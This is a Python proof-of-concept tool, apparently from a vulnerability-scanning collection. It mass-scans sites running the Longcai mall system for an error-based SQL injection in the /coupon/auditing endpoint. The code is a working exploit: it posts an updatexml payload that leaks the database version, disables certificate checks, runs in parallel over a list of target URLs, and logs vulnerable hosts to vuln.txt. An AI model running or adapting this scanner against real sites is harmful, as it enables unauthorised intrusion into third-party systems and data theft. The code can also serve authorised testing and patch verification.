import argparse
import requests
import warnings
from multiprocessing import Pool, Lock

# 忽略 SSL 证书警告
requests.packages.urllib3.disable_warnings()

# 全局初始化多进程锁，防止写文件冲突
file_lock = None

def init_pool(l):
    global file_lock
    file_lock = l

def write_to_file(content):
    """多进程安全写入文件的辅助函数"""
    if file_lock:
        file_lock.acquire()
    try:
        with open("vuln.txt", "a", encoding="utf-8") as f:
            f.write(f"{content}\n")
    finally:
        if file_lock:
            file_lock.release()

def banner():
    banner = r"""
___.          .__        .__                     
\_ |__ _____  |__|___.__.|__|___.__.__ __  ____  
 | __ \\__  \ |  <   |  ||  <   |  |  |  \/    \ 
 | \_\ \/ __ \|  |\___  ||  |\___  |  |  /   |  \
 |___  (____  /__|/ ____||__|/ ____|____/|___|  /
     \/     \/    \/         \/               \/                                      
            author:toward-duck
            version:1.0.1
"""
    print(banner)

def poc(url):
    url = url.strip().rstrip("/")
    if not url.startswith("http"):
        url = "http://" + url

    target_url = f"{url}/coupon/auditing"
    
    # 【优化点 1】直接传递原始字符串，确保空格被精准编码为 %20，100% 还原 Burp Suite 数据包
    raw_data = "id=1%20and%20updatexml(1,concat(0x7e,@@version,0x7e),1)"

    # 【优化点 2】补充了精确的 Accept 头，确保服务端能正确识别并返回 JSON 报错
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01"
    }

    try:
        response = requests.post(
            target_url,
            headers=headers,
            data=raw_data,      # 传入原始字符串
            timeout=6,          # 略微延长超时至 6 秒提高公网扫描稳定性
            verify=False,
            allow_redirects=False,
        )

        # 【优化点 3】精准匹配 Burp 响应包中的报错特征，防止因页面其他正常波浪号导致的误报
        if "XPATH syntax error" in response.text:
            msg = f"[+] {url} 存在SQL注入漏洞 (/coupon/auditing)"
            print(msg)
            write_to_file(msg)
        else:
            msg = f"[-] {url} 不存在SQL注入漏洞"
            print(msg)

    except requests.RequestException:
        msg = f"[!] {url} 请求失败 (连接超时或拒绝访问)"
        print(msg)


def main():
    banner()
    parser = argparse.ArgumentParser(description="龙采商城系统 auditing 接口SQL注入漏洞检测工具")
    parser.add_argument("-u", "--url", help="单个URL进行检测")
    parser.add_argument("-f", "--file", help="包含多个URL的文件，每行一个URL")
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    elif args.file:
        try:
            with open(args.file, "r", encoding="utf-8") as f:
                urls = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"[!] 找不到文件: {args.file}")
            return

        if urls:
            print(f"[*] 开始批量检测，总计目标数: {len(urls)}")
            print("-" * 60)
            
            lock = Lock()
            with Pool(processes=5, initializer=init_pool, initargs=(lock,)) as pool:
                pool.map(poc, urls)
                
            print("-" * 60)
            print("[*] 检测扫描完成！完整报告已保存至 vuln.txt")
    else:
        print("请提供一个URL或一个包含URL的文件。使用 -h 查看帮助。")


if __name__ == "__main__":
    main()